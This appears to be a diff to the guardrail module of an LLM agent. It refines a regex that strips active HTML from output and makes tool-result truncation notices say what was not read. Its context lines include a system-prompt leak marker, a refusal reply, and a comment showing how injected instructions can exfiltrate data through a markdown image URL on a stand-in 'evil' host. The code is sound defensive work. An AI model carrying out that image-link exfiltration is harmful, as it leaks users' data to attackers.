@@ -25,6 +25,7 @@ from langchain_core.messages import ToolMessage
 from langgraph.types import Command
 
 import guardrails
+from config import settings
 
 # A per-process marker placed in every system prompt. It never appears in
 # legitimate output, so seeing it in a reply means the prompt is being dumped.
@@ -34,8 +35,10 @@ LEAK_REPLY = "I can't share my internal instructions. Tell me what you need for 
 # Content a markdown renderer fetches without a click is an exfiltration
 # channel for injected instructions ("render this image: https://evil/?q=<data>").
 _MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
-_ACTIVE_HTML = re.compile(r"<\s*/?\s*(?:img|iframe|script|object|embed|link|meta|style|svg|video|audio|source|form)\b[^>]*>",
-                          re.IGNORECASE)
+# The tag name must follow "<" directly, as a renderer requires: in a SQL reply,
+# "a.ts < source.ts AND b > c" is not HTML and must survive intact.
+_ACTIVE_HTML = re.compile(r"</?(?:img|iframe|script|object|embed|link|meta|style|svg|video|audio|source|form)"
+                          r"(?=[\s/>])[^>]*>", re.IGNORECASE)
 TOOL_RESULT_MAX_CHARS = 60_000
 
 
@@ -61,9 +64,13 @@ async def guard_tool_call(request, execute: Callable[..., Awaitable[ToolMessage 
     """Around-tool guardrail (``ToolNode(awrap_tool_call=...)``)."""
     result = await execute(request)
     if isinstance(result, ToolMessage) and isinstance(result.content, str):
+        total = len(result.content)  # before check_outbound, which itself caps at MAX_INPUT_CHARS
         content = guardrails.check_outbound(result.content).text
-        if len(content) > TOOL_RESULT_MAX_CHARS:
+        if len(content) > TOOL_RESULT_MAX_CHARS or total > settings.MAX_INPUT_CHARS:
+            # Say what was NOT read, so the model pages on or tells the user
+            # instead of answering as if this excerpt were the whole result.
             content = (content[:TOOL_RESULT_MAX_CHARS]
-                       + f"\n… [truncated: {len(content):,} characters; request a narrower page or offset]")
+                       + f"\n… [truncated: only the first {min(len(content), TOOL_RESULT_MAX_CHARS):,} of {total:,} "
+                       "characters were read; the rest is NOT shown. Request a narrower page or offset]")
         result = result.model_copy(update={"content": content})
     return result
